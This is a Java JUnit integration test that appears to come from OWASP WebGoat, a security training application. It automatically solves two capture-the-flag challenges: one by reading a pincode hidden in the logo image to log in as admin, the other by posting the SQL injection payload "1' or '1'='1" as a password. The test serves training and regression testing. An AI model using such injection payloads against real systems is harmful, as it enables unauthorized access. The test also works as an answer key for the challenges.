package org.owasp.webgoat;


import static org.junit.jupiter.api.Assertions.assertTrue;

import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.junit.jupiter.api.Test;

import io.restassured.RestAssured;
import static org.owasp.webgoat.challenges.SolutionConstants.PASSWORD;


public class ChallengeTest extends IntegrationTest {
	
	@Test
    public void testChallenge1() {
    	startLesson("Challenge1");      
    	
    	byte[] resultBytes = 
        		RestAssured.given()
                .when()
                .relaxedHTTPSValidation()
                .cookie("JSESSIONID", getWebGoatCookie())
                .get(url("/WebGoat/challenge/logo"))
                .then()
                .statusCode(200)
                .extract().asByteArray();
    	
    	String pincode = new String(Arrays.copyOfRange(resultBytes, 81216, 81220));
    	Map<String, Object> params = new HashMap<>();
        params.clear();
        params.put("username", "admin");
        params.put("password", PASSWORD.replace("1234", pincode));
       
    	
        checkAssignment(url("/WebGoat/challenge/1"), params, true);
        String result = 
        		RestAssured.given()
                .when()
                .relaxedHTTPSValidation()
                .cookie("JSESSIONID", getWebGoatCookie())
                .formParams(params)
                .post(url("/WebGoat/challenge/1"))
                .then()
                .statusCode(200)
                .extract().asString();
        
        String flag = result.substring(result.indexOf("flag")+6,result.indexOf("flag")+42);
    	params.clear();
       	params.put("flag", flag);
        checkAssignment(url("/WebGoat/challenge/flag"), params, true);
         
  
        checkResults("/challenge/1");      
        
        List<String> capturefFlags = 
        		RestAssured.given()
                .when()
                .relaxedHTTPSValidation()
                .cookie("JSESSIONID", getWebGoatCookie())
                .get(url("/WebGoat/scoreboard-data"))
                .then()
                .statusCode(200)
                .extract().jsonPath()
                .get("find { it.username == \"" + getWebgoatUser() + "\" }.flagsCaptured");
        assertTrue(capturefFlags.contains("Admin lost password"));
    }
	
	@Test
    public void testChallenge5() {
    	startLesson("Challenge5");      
    	
    	Map<String, Object> params = new HashMap<>();
        params.clear();
        params.put("username_login", "Larry");
        params.put("password_login", "1' or '1'='1");
       
        String result = 
        		RestAssured.given()
                .when()
                .relaxedHTTPSValidation()
                .cookie("JSESSIONID", getWebGoatCookie())
                .formParams(params)
                .post(url("/WebGoat/challenge/5"))
                .then()
                .statusCode(200)
                .extract().asString();
        
        String flag = result.substring(result.indexOf("flag")+6,result.indexOf("flag")+42);
    	params.clear();
       	params.put("flag", flag);
        checkAssignment(url("/WebGoat/challenge/flag"), params, true);
         
  
        checkResults("/challenge/5");      
        
        List<String> capturefFlags = 
        		RestAssured.given()
                .when()
                .relaxedHTTPSValidation()
                .cookie("JSESSIONID", getWebGoatCookie())
                .get(url("/WebGoat/scoreboard-data"))
                .then()
                .statusCode(200)
                .extract().jsonPath()
                .get("find { it.username == \"" + getWebgoatUser() + "\" }.flagsCaptured");
        assertTrue(capturefFlags.contains("Without password"));
    }
    
}
